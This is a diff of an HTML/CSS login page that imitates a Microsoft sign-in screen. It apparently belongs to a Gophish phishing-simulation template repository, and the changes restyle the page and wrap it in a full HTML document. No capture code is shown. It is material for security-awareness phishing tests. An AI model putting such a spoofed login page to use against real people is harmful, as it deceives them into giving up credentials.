@@ -1,151 +1,155 @@
-<style>
-    @font-face {
-        font-family: 'Segoe UI';
-        src: local('Segoe UI'), local('SegoeUI'), url('https://fonts.cdnfonts.com/css/segoe-ui');
-    }
-    body {
-        margin: 0;
-        background: url('https://wallpaperaccess.com/full/1938375.jpg') no-repeat center center fixed;
-        background-size: cover;
-        height: 100vh;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    }
-    .login-container {
-        background: white;
-        padding: 40px;
-        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-        max-width: 400px;
-        width: 100%;
-        text-align: left;
-    }
-    .login-header {
-        display: flex;
-        align-items: center;
-        margin-bottom: 30px;
-    }
-    .login-header img {
-        width: 24px;
-        height: 24px;
-        margin-right: 8px;
-    }
-    .login-header h2 {
-        font-size: 24px;
-        font-weight: 600;
-        margin: 0;
-        color: #1b1b1b;
-    }
-    .form-group {
-        margin-bottom: 20px;
-    }
-    .form-control {
-        border: none;
-        border-bottom: 1px solid #ccc;
-        border-radius: 0;
-        padding: 10px 0;
-        font-size: 16px;
-        width: 100%;
-        box-sizing: border-box;
-    }
-    .form-control:focus {
-        border-bottom: 2px solid #0078d4;
-        outline: none;
-    }
-    .form-control.error {
-        border-bottom: 2px solid #e81123;
-    }
-    .error-message {
-        color: #e81123;
-        font-size: 14px;
-        margin-top: 5px;
-        display: none;
-    }
-    .button-container {
-        display: flex;
-        justify-content: flex-end;
-        margin-top: 20px;
-    }
-    .btn-next {
-        background: #0067b8;
-        color: white;
-        border: none;
-        border-radius: 0;
-        padding: 8px 20px;
-        font-size: 16px;
-        cursor: pointer;
-        width: 100px;
-    }
-    .btn-next:hover {
-        background: #005da6;
-    }
-    .horizontal-links {
-        margin-top: 20px;
-        font-size: 14px;
-    }
-    .horizontal-links a {
-        color: #0067b8;
-        text-decoration: none;
-    }
-    .horizontal-links a:hover {
-        text-decoration: underline;
-    }
-    .forgot-password-link {
-        display: none;
-        margin-top: 10px;
-        font-size: 14px;
-    }
-    .forgot-password-link a {
-        color: #0067b8;
-        text-decoration: none;
-    }
-    .connection-options {
-        background: white;
-        border: 1px solid #ccc;
-        padding: 12px;
-        margin-top: 20px;
-        display: flex;
-        align-items: center;
-        cursor: pointer;
-    }
-    .connection-options:hover {
-        background: #f9f9f9;
-    }
-    .connection-options img {
-        width: 20px;
-        margin-right: 10px;
-    }
-    .connection-options a {
-        color: #1b1b1b;
-        text-decoration: none;
-        display: flex;
-        align-items: center;
-    }
-    #password, #password-error {
-        display: none;
-    }
-    .email-header {
-        display: flex;
-        align-items: center;
-        margin-bottom: 20px;
-    }
-    .back-button {
-        width: 24px;
-        height: 24px;
-        border-radius: 50%;
-        border: none;
-        background: url('https://raw.githubusercontent.com/PassAndSecure/Template_Gophish/main/Picture-Template/fleche_mdp.svg') no-repeat center;
-        background-size: 16px;
-        cursor: pointer;
-        margin-right: 10px;
-    }
-    .email-display {
-        font-size: 16px;
-        color: #1b1b1b;
-        margin-left: 10px;
-    }
-</style>
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        @font-face {
+            font-family: 'Segoe UI';
+            src: local('Segoe UI'), local('SegoeUI'), url('https://fonts.cdnfonts.com/css/segoe-ui');
+        }
+        body {
+            margin: 0;
+            background: linear-gradient(135deg, #f0f7ff, #d9ecff);
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        .login-container {
+            background: white;
+            padding: 40px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            width: 100%;
+            text-align: left;
+        }
+        .login-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+        .login-header img {
+            width: 24px;
+            height: 24px;
+            margin-right: 8px;
+        }
+        .login-header h2 {
+            font-size: 24px;
+            font-weight: 600;
+            margin: 0;
+            color: #1b1b1b;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-control {
+            border: none;
+            border-bottom: 1px solid #ccc;
+            border-radius: 0;
+            padding: 10px 0;
+            font-size: 16px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        .form-control:focus {
+            border-bottom: 2px solid #0078d4;
+            outline: none;
+        }
+        .form-control.error {
+            border-bottom: 2px solid #e81123;
+        }
+        .error-message {
+            color: #e81123;
+            font-size: 14px;
+            margin-top: 5px;
+            display: none;
+        }
+        .button-container {
+            display: flex;
+            justify-content: flex-end;
+            margin-top: 20px;
+        }
+        .btn-next {
+            background: #0067b8;
+            color: white;
+            border: none;
+            border-radius: 0;
+            padding: 8px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100px;
+        }
+        .btn-next:hover {
+            background: #005da6;
+        }
+        .horizontal-links {
+            margin-top: 20px;
+            font-size: 14px;
+        }
+        .horizontal-links a {
+            color: #0067b8;
+            text-decoration: none;
+        }
+        .horizontal-links a:hover {
+            text-decoration: underline;
+        }
+        .forgot-password-link {
+            display: none;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+        .forgot-password-link a {
+            color: #0067b8;
+            text-decoration: none;
+        }
+        .connection-options {
+            background: white;
+            border: 1px solid #ccc;
+            padding: 12px;
+            margin-top: 20px;
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+        }
+        .connection-options:hover {
+            background: #f9f9f9;
+        }
+        .connection-options img {
+            width: 20px;
+            margin-right: 10px;
+        }
+        .connection-options a {
+            color: #1b1b1b;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+        }
+        #password, #password-error {
+            display: none;
+        }
+        .email-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .back-button {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            border: none;
+            background: url('https://raw.githubusercontent.com/PassAndSecure/Template_Gophish/main/Picture-Template/fleche_mdp.svg') no-repeat center;
+            background-size: 16px;
+            cursor: pointer;
+            margin-right: 10px;
+        }
+        .email-display {
+            font-size: 16px;
+            color: #1b1b1b;
+            margin-left: 10px;
+        }
+    </style>
+    <title>Se connecter</title>
+</head>
 <body>
     <div class="login-container">
         <div class="login-header">
@@ -269,3 +273,5 @@
             }
         }
     </script>
+</body>
+</html>
